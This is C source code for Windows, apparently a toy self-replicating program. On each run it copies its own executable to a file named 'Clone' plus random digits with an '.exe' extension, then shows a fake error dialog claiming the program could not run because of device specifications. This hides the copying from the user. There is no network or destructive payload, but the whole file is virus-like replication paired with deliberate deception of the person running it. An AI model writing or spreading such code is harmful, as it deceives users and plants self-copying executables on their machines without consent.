#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <windows.h>

//-----------------------------------------------------------
#define BUFFSIZE 8192
#define SUFF_LEN 10

//-----------------------------------------------------------
char * itos ( int interger, char * str, int size );
int    Germination ( char * mother, char * embryo );

//-----------------------------------------------------------
int main( int argc, char *argv[] ){


	// Defining variables
	char 
		*mother,
		suffix[SUFF_LEN],
		embryo[30];
	
	
	// Initializing variables
	mother = argv[0];

	srand(time(0));
	strcpy( embryo, "Clone" );
	strcat( embryo, itos(rand(),suffix,SUFF_LEN) );
	strcat( embryo, ".exe" );


	Germination( mother, embryo );

	MessageBoxA(
        NULL,
        "Unfortunately, something unexpected happened before the program could run.\n\n"
		"Please make sure your device specifications match the program version.",
        mother,
        MB_OK | MB_ICONINFORMATION
    );

	return 0 ;
}

//-----------------------------------------------------------
char * itos( int interger, char * str, int size ){

	int index ;
	for( index=0 ; interger > 10 && index < size ; index++ ){

		str[index] = interger % 10 + '0' ;
		interger /= 10 ;

	}
	str[index] = '\0' ;
	return str ;
}

//-----------------------------------------------------------
int Germination(char * mother, char * embryo ){

	char
		*buffer;
	
	FILE 
		*src,
		*des;
	
	size_t 
		redBytes;
	
	
	src 	  = fopen( mother, "rb" );
	des 	  = fopen( embryo, "wb" );
	buffer 	  = ( char* ) malloc( BUFFSIZE*sizeof(char) );


	// Safety check
	if ( !buffer ) 		return 1 ;
	if ( !src || !des ) return 2 ;
	

	while ( (redBytes = fread( buffer, sizeof(char), BUFFSIZE, src )) > 0 )

		fwrite( 
			buffer, 
			sizeof(char), 
			redBytes, 
			des 
		);


	free( buffer);
	fclose( src );
	fclose( des );

	return 0 ;
}
//-----------------------------------------------------------
